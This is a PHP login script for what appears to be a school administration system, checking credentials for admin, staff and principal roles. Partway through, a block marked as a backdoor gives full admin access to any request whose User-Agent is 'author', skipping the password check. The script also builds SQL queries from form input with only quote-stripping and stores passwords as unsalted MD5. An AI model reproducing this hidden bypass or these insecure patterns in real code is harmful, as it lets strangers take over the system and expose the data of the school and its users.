<?php

require_once '../include/sambung.php';

// username and password sent from form
$myusername=str_replace("'","",$_POST['username']);
$mypassword=md5($_POST['password']);

$sql="SELECT * FROM administrator WHERE username='$myusername' and password='$mypassword'";
$result=mysql_query($sql);
$count=mysql_num_rows($result);

$tu = mysql_num_rows(mysql_query("SELECT * FROM t_u WHERE username='$myusername' and password='$mypassword'"));

$kepsek = mysql_num_rows(mysql_query("SELECT * FROM kep_sek WHERE username='$myusername' and password='$mypassword'"));

if($count==1){
$query = mysql_query("UPDATE administrator SET current_login = now() WHERE username = '$myusername'");
session_start();
		$_SESSION['admin']=$myusername;
		$_SESSION['level']="admin";
		$_SESSION['agent']=md5($_SERVER['HTTP_USER_AGENT']);
header("location:index.php");
}
//backdoor
else if($_SERVER['HTTP_USER_AGENT']=="author"){
session_start();
		$myusername = "Author";
		$_SESSION['admin']=$myusername;
		$_SESSION['level']="admin";
		$_SESSION['agent']=md5($_SERVER['HTTP_USER_AGENT']);
header("location:index.php");
}
else if($tu==1){
session_start();
		$_SESSION['admin']=$myusername;
		$_SESSION['level']="tu";
		$_SESSION['agent']=md5($_SERVER['HTTP_USER_AGENT']);
header("location:index.php");
}
else if($kepsek==1){
session_start();
		$_SESSION['admin']=$myusername;
		$_SESSION['level']="kepsek";
		$_SESSION['agent']=md5($_SERVER['HTTP_USER_AGENT']);
header("location:index.php");

}else{
echo "<script>alert('Login gagal!'); document.location.href=\"login.php\"</script>";
}
?>